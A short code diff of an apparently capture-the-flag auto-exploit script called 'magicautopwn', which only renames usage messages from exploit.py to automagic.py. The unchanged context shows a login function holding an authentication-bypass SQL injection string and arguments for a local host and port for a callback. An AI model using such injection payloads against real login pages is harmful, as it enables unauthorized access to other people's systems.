@@ -21,18 +21,18 @@ def handler(s: requests.session):
         }
     )
 def usage():
-    print("Usage; python3 ./exploit.py <localhost> <localport>")
+    print("Usage; python3 ./automagic.py <localhost> <localport>")
 try:
     localhost = sys.argv[1]
 except IndexError:
     print("Local Host Not Defined")
-    print('Usage: python3 ./exploit.py <Local Host> <Local Port>')
+    print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
     exit()
 try:
     localport = sys.argv[2]
 except IndexError:
     print("Local port Not Defined")
-    print('Usage: python3 ./exploit.py <Local Host> <Local Port>')
+    print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
     exit()
 def login():
     injection = "test' OR '1' = '1' -- -"
@@ -89,7 +89,7 @@ def main():
     head = h * 30
     print(head)
     print('magicautopwn')
-    print('Usage: python3 ./exploit.py <Local Host> <Local Port>')
+    print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
     print(head)
     return login()
 main()
